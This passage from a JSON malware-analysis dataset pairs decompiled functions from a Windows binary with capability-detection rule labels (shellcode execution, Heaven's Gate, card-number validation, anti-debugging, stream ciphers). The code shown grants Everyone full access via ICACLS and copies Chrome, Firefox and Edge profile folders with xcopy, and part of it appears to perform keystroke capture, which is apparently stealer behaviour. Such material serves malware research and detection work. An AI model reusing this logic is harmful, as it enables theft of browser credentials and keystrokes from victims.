        "decompiled_code": "\nint32_t __fastcall fcn.0040c4ae(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h;\n    uint var_4h;\n    \n    arg_8h = 0;\n    if (param_1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x6c);\n        if (arg_8h != 0) {\n            fcn.0040102c(arg_8h, param_1, 0x30);\n            *(arg_8h + 0x30) = param_1 + 0x30;\n            fcn.0040102c(arg_8h + 0x34, *(arg_8h + 0x2c) + param_1 + 0x30, 0xc);\n            iVar2 = *(arg_8h + 0x2c) + *(arg_8h + 0x30) + 0xc;\n            *(arg_8h + 0x40) = iVar2;\n            iVar1 = *(iVar2 + *(arg_8h + 0x3c));\n            iVar2 = *(arg_8h + 0x3c) + iVar2 + 4;\n            *(arg_8h + 0x44) = iVar1;\n            *(arg_8h + 0x48) = iVar2;\n            fcn.0040102c(arg_8h + 0x4c, iVar2 + iVar1, 0xc);\n            iVar2 = *(arg_8h + 0x48) + *(arg_8h + 0x44) + 0xc;\n            *(arg_8h + 0x58) = iVar2;\n            iVar1 = *(iVar2 + *(arg_8h + 0x54));\n            iVar2 = *(arg_8h + 0x54) + 4 + iVar2;\n            *(arg_8h + 0x5c) = iVar1;\n            *(arg_8h + 0x60) = iVar2;\n            *(arg_8h + 100) = *(iVar2 + iVar1);\n            *(arg_8h + 0x68) = iVar1 + 4 + iVar2;\n            fcn.0040c5b2(*(arg_8h + 0x2c), 0);\n            fcn.0040c5b2(*(arg_8h + 0x3c), 0);\n            fcn.0040c5b2(*(arg_8h + 0x44), 0);\n            fcn.0040c5b2(*(arg_8h + 0x54), 0);\n            fcn.0040c5b2(*(arg_8h + 0x5c), 0);\n            fcn.0040c5b2(*(arg_8h + 100), 0);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 672
    },
    "0040c808": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c808(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t arg_8h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_ESI;\n    uchar *puVar6;\n    uint uStack936;\n    uint uStack932;\n    char16_t *pcStack928;\n    uchar *puStack924;\n    uint uStack920;\n    uint uStack916;\n    uint uStack912;\n    uint uStack908;\n    uint uStack904;\n    uchar *puStack900;\n    uchar *puStack896;\n    uchar *puStack892;\n    uint uStack832;\n    char16_t *pcStack828;\n    uchar *puStack824;\n    uint uStack820;\n    uint uStack816;\n    uint uStack812;\n    uint uStack808;\n    uint uStack804;\n    uchar *puStack800;\n    uchar *puStack796;\n    uchar *puStack792;\n    char16_t *pcStack728;\n    char16_t *pcStack724;\n    uint uStack720;\n    uint uStack716;\n    uint uStack712;\n    uint uStack708;\n    uint uStack704;\n    uchar *puStack700;\n    uchar *puStack696;\n    uchar *puStack692;\n    uint uStack636;\n    uchar *puStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uchar *puStack604;\n    uchar *puStack600;\n    uchar *puStack596;\n    int32_t iVar7;\n    int32_t iStack552;\n    char16_t *pcVar8;\n    uchar auStack492 [12];\n    uchar auStack480 [16];\n    uchar auStack464 [24];\n    uchar auStack440 [436];\n    \n    uVar2 = fcn.004036f7(L\"rudp\");\n    puVar6 = &stack0xfffffe20;\n    fcn.00412c67(puVar6, uVar2);\n    fcn.00405feb();\n    fcn.00410c8a();\n    fcn.00410c8a();\n    pcVar8 = L\"\\\\ICACLS.exe\";\n    uVar3 = fcn.004036f7(L\"\\\\ICACLS.exe\");\n    fcn.00403447(uVar3);\n    fcn.00405feb();\n    fcn.00410c8a();\n    uVar3 = fcn.004036f7(L\"\\\\xcopy.exe\");\n    iStack552 = 0x40c89c;\n    fcn.00403447(uVar3);\n    iStack552 = 0x40c8a5;\n    fcn.00405feb();\n    iStack552 = 0x200;\n    arg_8h_00 = fcn.00401085();\n    iStack552 = 0x200;\n    iVar5 = arg_8h_00;\n    iVar7 = unaff_ESI;\n    fcn.00401052();\n    iStack552 = iVar7;\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar7 = iStack552;\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n    fcn.0040102c(arg_8h_00, iVar5, iVar4 * 2);\n    (*pcVar1)();\n    for (iVar5 = (*pcVar1)(); (iVar5 != 0 && (*(arg_8h_00 + iVar5 * 2) != 0x5c)); iVar5 = iVar5 + -1) {\n        *(arg_8h_00 + iVar5 * 2) = 0;\n    }\n    if (iVar7 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        iVar5 = arg_8h_00;\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        fcn.0040102c(arg_8h_00 + iVar4 * 2, iVar5, iVar7);\n        fcn.00410c8a();\n        iStack552 = 0x417788;\n        fcn.00405044(&stack0xfffffdd8);\n        fcn.004036f7(0x419040);\n        uVar3 = fcn.004036f7(arg_8h_00);\n        fcn.00403447(uVar3);\n        fcn.00405feb();\n        uVar3 = fcn.004036f7(L\"\\\" /GRANT:r *S-1-1-0:(OI)(CI)F /T\");\n        puStack596 = 0x40c999;\n        fcn.00403447(uVar3);\n        puStack596 = 0x40c9a2;\n        fcn.00405feb();\n        puStack596 = 0x44;\n        puStack604 = &stack0xfffffe48;\n        puStack600 = NULL;\n        uStack608 = 0x40c9b4;\n        puStack632 = puVar6;\n        uStack628 = uVar2;\n        fcn.00401052();\n        puStack596 = &stack0xfffffdf8;\n        puStack600 = &stack0xfffffe48;\n        puStack604 = NULL;\n        uStack608 = 0;\n        uStack612 = 0x8000000;\n        uStack616 = 0;\n        uStack620 = 0;\n        uStack624 = 0;\n        uStack636 = 0x40c9dc;\n        (*_sym.imp.KERNEL32.dll_CreateProcessW)();\n        pcVar1 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n        uStack636 = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n        uStack624 = 0x417788;\n        uStack620 = 10;\n        fcn.00405044(&stack0xfffffd90);\n        uStack628 = 0x417788;\n        uStack624 = 1;\n        fcn.00405044(&stack0xfffffd8c);\n        fcn.0040373f(&stack0xfffffd98);\n        uVar2 = fcn.004036f7(0x41908c);\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        fcn.004036f7(puStack632);\n        uVar2 = fcn.004036f7(L\"\\\\AppData\\\\Local\\\\Google\\\\\");\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        pcStack724 = L\"xcopy.exe /Y /E /C \";\n        fcn.004036f7(L\"xcopy.exe /Y /E /C \");\n        fcn.00403447(&stack0xfffffd74);\n        fcn.004033d1(0x419110);\n        puStack692 = 0x40cabb;\n        fcn.00403447(&stack0xfffffd84);\n        puStack692 = 0x44;\n        puStack700 = &stack0xfffffe30;\n        puStack696 = NULL;\n        uStack704 = 0x40cacc;\n        fcn.00401052();\n        puStack692 = &stack0xfffffda8;\n        puStack696 = &stack0xfffffe30;\n        puStack700 = NULL;\n        uStack704 = 0;\n        uStack708 = 0x8000000;\n        uStack712 = 0;\n        uStack716 = 0;\n        uStack720 = 0;\n        pcStack728 = pcVar8;\n        (*_sym.imp.KERNEL32.dll_CreateProcessW)();\n        (*pcVar1)();\n        uStack720 = 0x417788;\n        uStack716 = 0xb;\n        fcn.00405044(&stack0xfffffd30);\n        fcn.0040373f(&stack0xfffffd3c);\n        uVar2 = fcn.004036f7(0x419114);\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        fcn.004036f7(pcStack724);\n        uVar2 = fcn.004036f7(L\"\\\\AppData\\\\Roaming\\\\Mozilla\\\\\");\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        uVar2 = fcn.004036f7(L\"xcopy.exe /Y /E /C \");\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n        puStack824 = &stack0xfffffd28;\n        fcn.00403447(puStack824);\n        fcn.004033d1(0x419110);\n        fcn.00403447(&stack0xfffffd2c);\n        puStack792 = 0x40cbdf;\n        fcn.00405044(&stack0xfffffd00);\n        puStack792 = 0x44;\n        puStack800 = &stack0xfffffe14;\n        puStack796 = NULL;\n        uStack804 = 0x40cbf0;\n        fcn.00401052();\n        puStack792 = &stack0xfffffd54;\n        puStack796 = &stack0xfffffe14;\n        puStack800 = NULL;\n        uStack804 = 0;\n        uStack808 = 0x8000000;\n        uStack812 = 0;\n        uStack816 = 0;\n        uStack820 = 0;\n        uStack832 = 0x40cc17;\n        pcStack828 = pcVar8;\n        (*_sym.imp.KERNEL32.dll_CreateProcessW)();\n        uStack832 = 0xffffffff;\n        (*pcVar1)();\n        uStack820 = 0x417788;\n        uStack816 = 0xc;\n        fcn.00405044(&stack0xfffffccc);\n        fcn.0040373f(&stack0xfffffcd8);\n        uVar2 = fcn.004036f7(0x41917c);\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        fcn.004036f7(puStack824);\n        uVar2 = fcn.004036f7(L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\\");\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        uVar2 = fcn.004036f7(L\"xcopy.exe /Y /E /C \");\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n        puStack924 = &stack0xfffffcc0;\n        fcn.00403447(puStack924);\n        fcn.004033d1(0x419110);\n        fcn.00403447(&stack0xfffffcc4);\n        puStack892 = 0x40cd03;\n        fcn.00405044(&stack0xfffffc9c);\n        puStack892 = 0x44;\n        puStack900 = &stack0xfffffdf8;\n        puStack896 = NULL;\n        uStack904 = 0x40cd14;\n        fcn.00401052();\n        puStack892 = &stack0xfffffd00;\n        puStack896 = &stack0xfffffdf8;\n        puStack900 = NULL;\n        uStack904 = 0;\n        uStack908 = 0x8000000;\n        uStack912 = 0;\n        uStack916 = 0;\n        uStack920 = 0;\n        uStack932 = 0x40cd3b;\n        pcStack928 = pcVar8;\n        (*_sym.imp.KERNEL32.dll_CreateProcessW)();\n        uStack932 = 0xffffffff;\n        uStack936 = uStack808;\n        puVar6 = &stack0xfffffc58;\n        (*pcVar1)();\n        uStack920 = 0x417788;\n        uStack916 = 0xd;\n        fcn.00405044(&stack0xfffffc68);\n        fcn.0040373f(&stack0xfffffc74);\n        uVar2 = fcn.004036f7(0x4191f0);\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        fcn.004036f7(puStack924);\n        uVar2 = fcn.004036f7(L\"\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\\");\n        fcn.00403447(uVar2);\n        fcn.00405feb();\n        uVar2 = fcn.004036f7(L\"xcopy.exe /Y /E /C \");\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n        fcn.00403447(&stack0xfffffc58);\n        fcn.004033d1(0x419110);\n        fcn.00403447(&stack0xfffffc48);\n        fcn.00405044(&stack0xfffffc38);\n        fcn.00401052(&stack0xfffffddc, 0, 0x44);\n        (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                  (pcVar8, puVar6, 0, 0, 0, 0x8000000, 0, 0, &stack0xfffffddc, &stack0xfffffcac);\n        (*pcVar1)(puStack892, 0xffffffff);\n        fcn.00405044(&stack0xfffffde4);\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n        fcn.00405feb();\n    }\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 3109
    },
    "004153c7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004153c7(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack96 [4];\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 0x19;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.004021c1(auStack96, arg_ch);\n            fcn.00403873(arg_8h_00);\n            fcn.00401441();\n            iVar1 = fcn.004021c1(auStack92, arg_ch);\n            fcn.00403873(iVar1 + 4);\n            fcn.00401441();\n            iVar1 = fcn.004021c1(auStack88, arg_ch);\n            fcn.00403873(iVar1 + 8);\n            fcn.00401441();\n            iVar1 = fcn.004021c1(auStack84, arg_ch);\n            fcn.00403852(*(iVar1 + 0xc));\n            fcn.00401441();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 383
    },
    "00415847": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00415847(uint *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_10h == 0) {\n        if (*(in_ECX + 0x18) == 0) {\n            var_8h = 0;\n            var_ch = 0x417770;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX_05);\n        }\n    }\n    else if (arg_10h == 1) {\n        if (*(in_ECX + 0x34) == 0) {\n            var_ch = 0x417770;\n            var_8h = 1;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX_04);\n        }\n        in_ECX = in_ECX + 0x1c;\n    }\n    else if (arg_10h == 2) {\n        if (*(in_ECX + 0x50) == 0) {\n            var_ch = 0x417770;\n            var_8h = 2;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX_03);\n        }\n        in_ECX = in_ECX + 0x38;\n    }\n    else if (arg_10h == 3) {\n        if (*(in_ECX + 0x6c) == 0) {\n            var_ch = 0x417770;\n            var_8h = 3;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX_02);\n        }\n        in_ECX = in_ECX + 0x54;\n    }\n    else if (arg_10h == 4) {\n        if (*(in_ECX + 0x88) == 0) {\n            var_ch = 0x417770;\n            var_8h = 4;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX_01);\n        }\n        in_ECX = in_ECX + 0x70;\n    }\n    else if (arg_10h == 5) {\n        if (*(in_ECX + 0xc0) == 0) {\n            var_ch = 0x417770;\n            var_8h = 5;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX_00);\n        }\n        in_ECX = in_ECX + 0xa8;\n    }\n    else {\n        if (arg_10h != 6) {\n            *arg_8h = 0;\n            arg_8h[1] = 0;\n            return arg_8h;\n        }\n        if (*(in_ECX + 0xa4) == 0) {\n            var_ch = 0x417770;\n            var_8h = 6;\n            fcn.00405044(&var_ch);\n            fcn.004112b2(extraout_ECX);\n        }\n        in_ECX = in_ECX + 0x8c;\n    }\n    fcn.0040315e(in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 803
    },
    "00405b4e": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00405b4e(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_90h;\n    uint var_68h;\n    uint var_60h;\n    uint var_48h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(500);\n    fcn.0041196e();\n    uVar1 = fcn.00413323();\n    fcn.00411865(uVar1);\n    uVar1 = fcn.004034d1(0x417898);\n    fcn.004117d8(&var_90h, uVar1);\n    fcn.00405feb();\n    fcn.0040315e(&var_68h);\n    fcn.00402fce(&var_ch);\n    fcn.00403148();\n    fcn.00405aae(&var_14h);\n    iVar3 = *var_14h;\n    uVar1 = fcn.00413441(iVar3);\n    fcn.00403549(uVar1);\n    fcn.00405feb();\n    var_4h[5] = *(var_14h + iVar3 + 4);\n    iVar2 = *(var_14h + iVar3 + 8);\n    uVar1 = fcn.00413441(iVar2);\n    fcn.00403549(uVar1);\n    fcn.00405feb();\n    iVar2 = iVar3 + 0xc + iVar2;\n    var_4h[6] = *(var_14h + iVar2);\n    iVar3 = *(var_14h + iVar2 + 1);\n    uVar1 = fcn.00413441(iVar3);\n    fcn.00403549(uVar1);\n    fcn.00405feb();\n    iVar3 = iVar2 + 5 + iVar3;\n    var_4h[8] = *(var_14h + iVar3);\n    iVar2 = *(var_14h + iVar3 + 1);\n    uVar1 = fcn.00413441(iVar2);\n    fcn.00403549(uVar1);\n    fcn.00405feb();\n    iVar2 = iVar3 + 5 + iVar2;\n    var_4h[0xb] = *(var_14h + iVar2);\n    var_4h[0xd] = *(var_14h + iVar2 + 4);\n    var_4h[0xe] = *(var_14h + iVar2 + 5);\n    var_4h[0xf] = *(var_14h + iVar2 + 6);\n    var_4h[0x10] = *(var_14h + iVar2 + 7);\n    var_4h[0x11] = *(var_14h + iVar2 + 8);\n    var_4h[0x12] = *(var_14h + iVar2 + 9);\n    fcn.00413441(*(var_14h + iVar2 + 10));\n    fcn.00403549(&var_4h);\n    *var_4h = 1;\n    var_4h[1] = 1;\n    fcn.00405feb();\n    fcn.00403148();\n    fcn.00403148();\n    if (var_34h != 0) {\n        fcn.00401eb2(var_34h);\n    }\n    var_34h = 0;\n    var_2ch = 0;\n    var_30h = 0;\n    fcn.00403148();\n    fcn.0041140c();\n    return;\n}\n",
        "token_count": 850
    },
    "0040f29d": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f29d(void)\n\n{\n    int64_t iVar1;\n    uint var_98h;\n    uint var_28h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = fcn.0040f541();\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040f7de": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f7de(void)\n\n{\n    uint var_8h;\n    \n    return;\n}\n",
        "token_count": 25
    },
    "0040f81c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0040f81c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if ((arg_8h == 0) && (arg_ch == 0)) {\n        return 0;\n    }\n    return arg_ch;\n}\n",
        "token_count": 112
    },
    "0040f8a8": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f8a8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX != 0) {\n        if (((arg_8h != 0) || (arg_ch != 0)) && (in_EDX != 0)) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "004060e7": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060e7(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t *in_EDX;\n    uint32_t uVar3;\n    uint8_t *var_4h;\n    \n    uVar3 = 0;\n    uVar2 = 0;\n    var_4h = in_EDX;\n    for (; 0 < arg_8h; arg_8h = arg_8h + -1) {\n        uVar3 = uVar3 + 1 & 0x800000ff;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n        }\n        uVar1 = *(uVar3 + in_ECX);\n        uVar2 = uVar2 + uVar1 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        *(uVar3 + in_ECX) = *(uVar2 + in_ECX);\n        *(uVar2 + in_ECX) = uVar1;\n        *var_4h = *var_4h ^ *((*(uVar3 + in_ECX) + uVar1 & 0xff) + in_ECX);\n        var_4h = var_4h + 1;\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "00406154": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406154(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    iVar3 = 0;\n    do {\n        uVar1 = *(iVar3 + in_ECX);\n        uVar2 = uVar2 + *(iVar3 % arg_8h + in_EDX) + uVar1 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        *(iVar3 + in_ECX) = *(uVar2 + in_ECX);\n        iVar3 = iVar3 + 1;\n        *(uVar2 + in_ECX) = uVar1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 233
    },
    "0040630b": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040630b(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(in_ECX + 0x14);\n    iVar2 = *(in_ECX + 0x18);\n    uVar3 = uVar1 + arg_8h * 8;\n    *(in_ECX + 0x14) = uVar3;\n    if (uVar3 < uVar1) {\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = uVar1 >> 3 & 0x3f;\n    *(in_ECX + 0x18) = (arg_8h >> 0x1d) + iVar2;\n    if (uVar3 + arg_8h < 0x40) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = -uVar3 + 0x40;\n        fcn.0040102c(in_ECX + 0x1c + uVar3, in_EDX, iVar2);\n        fcn.004063dd();\n        for (uVar3 = -uVar3 + 0x7f; uVar3 < arg_8h; uVar3 = uVar3 + 0x40) {\n            fcn.004063dd();\n            iVar2 = iVar2 + 0x40;\n        }\n        uVar3 = 0;\n    }\n    fcn.0040102c(in_ECX + 0x1c + uVar3, in_EDX + iVar2, arg_8h - iVar2);\n    return;\n}\n",
        "token_count": 401
    },
    "00414ad1": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414ad1(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    fcn.00405de9();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x10) = arg_10h;\n    fcn.00405de9();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x14) = arg_ch;\n    uVar1 = (arg_14h >> 3 & 0x1f) * arg_ch * arg_10h;\n    uVar2 = uVar1 >> 0x1f;\n    uVar2 = (uVar1 ^ uVar2) - uVar2;\n    if ((uVar2 & 0xf) != 0) {\n        uVar2 = (uVar2 & 0xfffffff0) + 0x10;\n    }\n    fcn.00405de9();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x18) = uVar2;\n    return;\n}\n",
        "token_count": 291
    },
    "00408c13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00408c13(uint *param_1, uint8_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint lpKeyState;\n    \n    uVar2 = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    if (uVar2 < 0x5d) {\n        if (0x5a < uVar2) goto code_r0x00408d0a;\n        if (0x14 < uVar2) {\n            if ((uVar2 < 0x20) || ((0x28 < uVar2 && (uVar2 != 0x2e)))) goto code_r0x00408c6e;\n            goto code_r0x00408d0a;\n        }\n        if (uVar2 == 0x14) goto code_r0x00408d0a;\n        if (uVar2 < 8) goto code_r0x00408c6e;\n        if ((uVar2 < 10) || (uVar2 == 0xd)) goto code_r0x00408d0a;\n        if (uVar2 < 0x10) goto code_r0x00408c6e;\n        bVar3 = uVar2 < 0x12;\n        bVar4 = uVar2 == 0x12;\n    }\n    else {\n        if (0xb3 < uVar2) {\n            if ((uVar2 < 0xba) || ((0xc0 < uVar2 && ((uVar2 < 0xdb || (0xde < param_2)))))) goto code_r0x00408c6e;\n            goto code_r0x00408d0a;\n        }\n        if (0xb1 < uVar2) goto code_r0x00408d0a;\n        if (uVar2 < 0x60) goto code_r0x00408c6e;\n        if (uVar2 < 0x6a) goto code_r0x00408d0a;\n        if (uVar2 < 0xad) goto code_r0x00408c6e;\n        bVar3 = uVar2 < 0xaf;\n        bVar4 = uVar2 == 0xaf;\n    }\n    if (!bVar3 && !bVar4) {\ncode_r0x00408c6e:\n        fcn.00401052(&lpKeyState, 0, 0x100);\n        uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar2, 0);\n        (*_sym.imp.USER32.dll_ToUnicode)(uVar2, uVar1, &lpKeyState, param_1 + 2, 1, 0);\n        return param_1;\n    }\ncode_r0x00408d0a:\n    param_1[1] = uVar2;\n    return param_1;\n}\n",
        "token_count": 684
    },
    "004085c0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.004085c0(void)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetKeyState)(0x14);\n    return uVar1 & 1;\n}\n",
        "token_count": 53
    },
    "00411c75": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411c75(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t extraout_DL;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = fcn.00411be3();\n    uVar2 = uVar1;\n    uVar3 = extraout_DL;\n    if (uVar1 != 0) {\n        uVar2 = fcn.00411b6d(5, &var_4h);\n        if ((uVar2 == 0) || (iVar4 = var_4h,  var_4h == 0)) {\n            uVar3 = ~*(uVar1 + 0x16) & 1;\n        }\n        else {\n            do {\n                iVar4 = iVar4 - *(uVar2 + 4);\n                uVar2 = fcn.004119bf(uVar2 + 8, arg_8h, arg_ch);\n                if (uVar2 == 0) break;\n            } while (iVar4 != 0);\n            uVar3 = 1;\n        }\n    }\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 295
    },
    "0040a36f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
